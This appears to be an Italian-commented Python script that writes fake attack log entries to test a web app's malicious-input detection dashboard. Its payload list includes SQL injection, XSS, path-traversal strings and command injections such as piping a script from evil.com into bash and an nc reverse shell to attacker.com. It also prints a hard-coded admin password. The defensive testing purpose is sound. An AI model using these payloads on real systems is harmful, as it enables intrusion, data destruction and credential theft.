"""
Script per testare il sistema di rilevamento input malevoli
Genera vari tipi di attacchi per verificare il funzionamento del validator
"""
from model import db
from model.log import create_log
from app import app
from datetime import datetime

# Esempi di input malevoli da testare
MALICIOUS_INPUTS = {
    'SQL_INJECTION': [
        "admin' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "' UNION SELECT * FROM users--",
        "1' AND 1=1--",
        "'; DROP TABLE users--",
        "admin' OR 'a'='a",
        "1' OR '1'='1",
    ],
    'XSS': [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert('XSS')",
        "<svg/onload=alert(1)>",
        "<iframe src='javascript:alert(1)'>",
        "<body onload=alert(1)>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    ],
    'COMMAND_INJECTION': [
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& format c:",
        "; curl http://evil.com/malware.sh | bash",
        "`wget http://malware.com/virus`",
        "$(cat /etc/shadow)",
        "; nc -e /bin/bash attacker.com 1234",
    ],
    'PATH_TRAVERSAL': [
        "../../etc/passwd",
        "../../../windows/system32/config/sam",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..\\..\\..\\windows\\system32",
        "/etc/shadow",
        "c:\\windows\\system32\\drivers\\etc\\hosts",
    ]
}

def generate_test_attacks():
    """Genera log di test per vari tipi di attacchi"""
    
    print("\n🧪 GENERAZIONE TEST ATTACCHI MALEVOLI\n")
    print("=" * 60)
    
    with app.app_context():
        total = 0
        
        for attack_type, examples in MALICIOUS_INPUTS.items():
            print(f"\n📍 Generando attacchi {attack_type}...")
            
            # Genera diversi IP per variare
            base_ips = ['192.168.1.100', '10.0.0.50', '172.16.0.10', '203.0.113.5']
            
            for i, example in enumerate(examples):
                ip = base_ips[i % len(base_ips)]
                
                # Crea log di attacco
                create_log(
                    ip=ip,
                    log_type=f"MALICIOUS_INPUT_{attack_type}",
                    user=None,
                    is_error=True
                )
                total += 1
                print(f"  ✓ {attack_type} da {ip}: {example[:50]}...")
        
        print("\n" + "=" * 60)
        print(f"✅ Creati {total} log di attacchi malevoli")
        print("\n📊 DISTRIBUZIONE:")
        for attack_type, examples in MALICIOUS_INPUTS.items():
            print(f"   - {attack_type}: {len(examples)} tentativi")
        
        print("\n💡 PROSSIMI PASSI:")
        print("   1. Avvia l'app: python app.py")
        print("   2. Fai login come admin (admin/Admin123!)")
        print("   3. Vai su /logs per vedere gli attacchi rilevati")
        print("\n🔒 Il sistema dovrebbe mostrare tutti questi attacchi nella dashboard!")

if __name__ == '__main__':
    generate_test_attacks()
